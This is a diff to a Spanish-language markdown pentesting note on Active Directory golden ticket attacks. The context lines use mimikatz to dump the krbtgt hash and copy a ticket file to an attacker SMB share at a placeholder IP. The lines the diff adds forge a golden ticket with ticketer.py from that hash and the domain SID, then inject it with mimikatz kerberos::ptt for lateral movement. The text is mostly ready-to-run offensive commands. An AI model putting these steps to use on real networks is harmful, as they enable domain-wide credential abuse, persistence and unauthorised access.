@@ -9,6 +9,11 @@ Posteriormente ejecutamos el mimikatz con `mimikatz.exe` y en la sesión interac
 ```
 lsadump::lsa /inject /name:krbtgt
 ```
+Ahora creamos un ticket con ticketer.py ejecutando el siguiente comando:
+```
+ticketer.py -nthash <hash_NTLM> -domain-sid <sid_krbtgt> -domain <dominio> <nombre_exportación>
+```
+[Ver ejemplo](Images/users/README.md)
 
 # Movimiento Lateral
 Podemos crear un `golden.kirbi` para cargarlo con mimikatz en una máquina y ganar privilegios de acceso a un equipo, para ello en una sesión de mimikatz haremos lo siguiente:
@@ -24,4 +29,8 @@ impacket-smbserver smbFolder $(pwd) -smb2support
 Máquina víctima:
 ```
 copy golden.kirby \\<ip_atacante>\smbFolder\golden.kirbi
+```
+Ahora nos conectamos al equipo donde queremos hacer un `Pass The Ticket`, subimos el mimikatz, lo ejecutamos y en la sesión interactiva ponemos lo siguiente:
+```
+kerberos::ptt golden.kirby
 ```
